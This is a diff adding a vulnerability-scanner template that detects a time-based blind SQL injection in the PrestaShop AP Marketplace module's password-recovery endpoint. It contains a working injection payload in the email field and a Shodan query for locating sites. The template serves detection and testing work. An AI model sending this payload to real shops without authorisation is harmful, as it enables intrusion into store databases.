@@ -1,0 +1,36 @@
+id: prestashop-apmarketplace-sqli
+
+info:
+  name: PrestaShop Ap Marketplace - SQL Injection
+  author: mastercho
+  severity: high
+  description: |
+    The AP Marketplace Prestashop module is vulnerable to Blind/Time SQL Injection. An attacker can exploit this vulnerability to execute arbitrary SQL queries on the underlying database.
+  reference:
+    - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
+  metadata:
+    verified: true
+    shodan-query: http.component:"Prestashop"
+  tags: time-based-sqli,prestashop,sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /m/apmarketplace/passwordrecovery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{RootURL}}
+        X-Requested-With: XMLHttpRequest
+
+        email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=
+
+    host-redirects: true
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'contains(body, "module-apmarketplace-passwordrecovery")'
+        condition: and
+# digest: 4a0a00473045022100c82748da12466f568c443366bf8524d7e16ef0a87bde04cfadc127c0aca3a2c602200c7e542de48649235fa20cca65fefacb5b8ddfd9b3be52ca6070e429fcaa14be:922c64590222798bb761d5b6d8e72950
